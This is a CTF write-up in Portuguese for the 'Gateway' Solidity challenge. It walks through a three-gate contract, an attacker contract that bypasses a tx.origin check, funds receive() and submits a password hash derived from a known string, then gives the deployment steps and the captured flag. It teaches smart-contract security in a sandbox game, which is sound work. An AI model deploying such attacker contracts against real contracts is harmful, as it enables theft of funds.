# PoC — Gateway (Blockchain / Solidity, 50 pts) — #52

**Flag:** `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`
*(o netcat devolve `CSS{B451C_BL0CKCH41N_5K1LL5}`; formato final `CSSCTF{CSS{...}}`.)*

## Enunciado
> The reboot has awakened an abandoned UPDC checkpoint guarding access to the Quantum Nexus Network. Its emergency gate still demands three proofs of clearance... Find your way through all three doors and claim the credentials left inside.
> The ticket is your team name, case-sensitive. `nc 34.116.80.78 31337`

Infra: launcher `eth_sandbox` (estilo Paradigm). `action 1` = lança blockchain privada (dá RPC, private key com 5000 ETH, endereço do `Setup`); `action 3` = valida `Setup.isSolved()` e entrega a flag. Ticket = nome do time (`COPCIBER-DSI`).

## Contrato (3 portas)
```solidity
function enter() external {           // Porta 1
    require(tx.origin != msg.sender);  // => tem de ser chamado por um CONTRATO
    stepped = true;
}
receive() external payable {          // Porta 2
    require(stepped);
    require(msg.value > 0);            // => enviar ether
    funded = true;
}
function claim(bytes32 _password) external {   // Porta 3
    require(stepped); require(funded);
    require(_password == password);    // password = keccak256("gateway to the flag")
    solved = true;
}
```

### Vulnerabilidades / observações
1. **Porta 1:** `tx.origin != msg.sender` só é satisfeito quando a chamada vem de um **contrato intermediário** (tx.origin = EOA, msg.sender = contrato).
2. **Porta 2:** `receive()` dispara ao enviar ether com **calldata vazia**. O ether do `Setup` vai pro construtor do `Gate` (payable) e **não** passa pelo `receive()`, então `funded` começa `false` — é preciso transferir ether explicitamente.
3. **Porta 3:** `password` é `private`, mas é **determinístico** e computável de fora: `keccak256(abi.encodePacked("gateway to the flag"))` = `0x90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b`. "private" no Solidity não é segredo.

As três portas não têm controle de acesso → um único contrato atacante abre todas numa transação.

## Exploit — contrato atacante
```solidity
interface IGate { function enter() external; function claim(bytes32) external; }
contract Attack {
    constructor(address payable gate) payable {
        IGate(gate).enter();                               // Porta 1 (msg.sender = este contrato)
        (bool ok,) = gate.call{value: msg.value}("");      // Porta 2 (dispara receive())
        require(ok);
        IGate(gate).claim(keccak256(abi.encodePacked("gateway to the flag"))); // Porta 3
    }
}
```
Deploy com `value > 0` (usei 0.001 ETH). `tx.origin` = minha EOA, `msg.sender` dentro do `enter()` = contrato `Attack` → passa a porta 1.

## Passos
```bash
# 1) launcher action 1, ticket = COPCIBER-DSI -> RPC / privkey / setup
# 2) compilar Attack.sol (solc 0.8.20)
solc --combined-json bin,abi Attack.sol
# 3) deploy + verificação (web3.py)
python3 deploy.py <RPC> <PRIVKEY> <SETUP_ADDR>
#   -> lê gate() do Setup, deploya Attack com value, isSolved()=True
# 4) launcher action 3, ticket = COPCIBER-DSI -> flag
```

## Resultado
```
connected: True chainId: 1
me: 0xc004...a04a balance: 5000 ETH
gate: 0x168eeE24C6e6fBA2dDBE984d866A199934B505e7
deploy tx status: 1
isSolved(): True
--- action 3 ---
CSS{B451C_BL0CKCH41N_5K1LL5}
```

## Lição
- Guarda `tx.origin != msg.sender` é um anti-padrão: facilmente contornada por um contrato intermediário (e perigosa porque quebra account abstraction).
- Variáveis `private`/`bytes32 password` **não são secretas** — leem-se do storage e, aqui, o valor é derivável de uma string conhecida.
- `receive()`/`fallback` disparam conforme a calldata; enviar ether via `.call{value:}("")` ativa `receive()`.

## Artefatos (scratchpad da sessão)
- `Attack.sol`, `attack.bin`/`attack.json` — contrato atacante compilado
- `deploy.py` — deploy + verificação via web3.py 8.0
